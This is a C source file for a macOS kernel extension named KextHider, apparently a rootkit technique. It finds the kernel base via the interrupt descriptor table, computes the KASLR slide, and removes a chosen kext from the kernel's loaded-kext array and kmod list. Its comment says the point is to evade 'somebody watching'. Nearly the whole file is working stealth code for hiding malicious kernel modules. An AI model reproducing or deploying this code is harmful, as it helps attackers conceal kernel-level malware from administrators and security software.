//
//  KextHider.c
//   by @_rc0r
//

#include "KextHider.h"

kern_return_t KextHider_start(kmod_info_t * ki, void *d)
{
    DLOG( "[+] Supplied kmod_info_t start addr: %016lX\n", ki->address );
    DLOG( "[+] Supplied kmod_info_t size: %ld\n", ki->size );
    DLOG( "[+] Supplied kmod_info_t name: %s\n", ki->name );
    DLOG( "[+] Supplied kmod_info_t next: %016lX\n", ki->next->address );
    
    find_kernel_baseaddr();
    
    vm_offset_t slide = KERNEL_MH_START_ADDR - DEFAULT_KERNEL_SA;
    
    DLOG( "[+] Kernel ASLR slide: 0x%016lX\n", slide );
    
    /** clean up OSArray of OSKexts **/
    mach_vm_address_t *sLoadedKexts = ( mach_vm_address_t * ) ( SKEXTLOADED_ADDR + slide );
    uint32_t *kext_count = NULL;
    
    kext_count = ( uint32_t * ) (*((mach_vm_address_t *)sLoadedKexts)+0x20);
    DLOG( "[+] Loaded kext count: %u\n", *kext_count );
    
    mach_vm_address_t *KextArr = ( mach_vm_address_t * ) ((*sLoadedKexts)+0x18);
    
    DLOG( "[+] ko[0].addr = 0x%016llx\n", *KextArr );

    mach_vm_address_t *ko = (mach_vm_address_t *) *KextArr;

    for( uint8_t i = 0x0; i<*kext_count; i++ )
    {
        kmod_info_t *kmod_info = NULL;
        mach_vm_address_t *kmod_ptr = (mach_vm_address_t *) (ko[i]+0x48);
        kmod_info = ( kmod_info_t * ) *kmod_ptr;
        //DLOG( "[+] kmod_info @ 0x%016llx\n", ( mach_vm_address_t ) *kmod_ptr );
        //DLOG( "[+] kmod_info.name = \"%s\"\n", kmod_info->name );
        
        if( strncmp( kmod_info->name, kextToHide, strlen( kmod_info->name ) ) == 0 )
        {
            DLOG( "[+] Module found at pos. %d of array (0x%016llx)!\n", i, ko[i] );
            
            // now go and remove the entry and adjust count of OSArray
            // stripped from OSArray::removeObject()
            if( i>0 )
            {
                (*kext_count)--;
                
                for( uint8_t j = i; j < (*kext_count); j++ )
                    ko[j]=ko[j+1];
            }
        }
    }
    
    /** do cleanup of kmod list, just in case somebody is watching **/
    
    // points to head of queue which is some bogus? kmod_info
    // next kmod_info belongs to last loaded kext
    kmod_info_t *kmod = ( kmod_info_t * ) ( KMOD_ADDR + slide );
    
    //DLOG( "[+] Kmod first entry name: \"%s\"\n", kmod->next->name );
    
    kmod_info_t *kmod_info = kmod;
    kmod_info_t *kmod_infop = kmod;
    
    // print list before cleanup
    //while ( ( kmod_info = kmod_info->next ) != NULL )
    //    DLOG( "[b] %s\n", kmod_info->name );
    //kmod_info = kmod;
    
    while ( ( kmod_info = kmod_info->next ) != NULL )
    {
        if( strncmp( kmod_info->name, kextToHide, strlen( kmod_info->name ) ) == 0 )
        {
            kmod_infop->next = kmod_info->next;
            continue;
        }
        
        kmod_infop = kmod_infop->next;
    }

    //kmod_info = kmod;
    // print list after cleanup
    //while ( ( kmod_info = kmod_info->next ) != NULL )
    //    DLOG( "[c] %s\n", kmod_info->name );
    
    return KERN_SUCCESS;
}

kern_return_t KextHider_stop(kmod_info_t *ki, void *d)
{
    return KERN_SUCCESS;
}

uint64_t find_kernel_baseaddr( )
{
    uint8_t idtr[ 10 ];
    uint64_t idt = 0;
    
    __asm__ volatile ( "sidt %0": "=m" ( idtr ) );
    
    idt = *( ( uint64_t * ) &idtr[ 2 ] );
    struct descriptor_idt *int80_descriptor = NULL;
    uint64_t int80_address = 0;
    uint64_t high = 0;
    uint32_t middle = 0;
    
    int80_descriptor = ( struct descriptor_idt * ) _MALLOC( sizeof( struct descriptor_idt ), M_TEMP, M_WAITOK );
    bcopy( (void*)idt, int80_descriptor, sizeof( struct descriptor_idt ) );
    
    high = ( unsigned long ) int80_descriptor->offset_high << 32;
    middle = ( unsigned int ) int80_descriptor->offset_middle << 16;
    int80_address = ( uint64_t )( high + middle + int80_descriptor->offset_low );
    
    uint64_t temp_address = int80_address;
    uint8_t *temp_buffer = ( uint8_t * ) _MALLOC( 4, M_TEMP, M_WAITOK );
    
    while( temp_address > 0 )
    {
        bcopy( ( void * ) temp_address, temp_buffer, 4 );
        if ( *( uint32_t * )( temp_buffer ) == MH_MAGIC_64 )
        {
            KERNEL_MH_START_ADDR = temp_address;
            return 0;
        }
        temp_address -= 1;
    }
    
    return -1;
}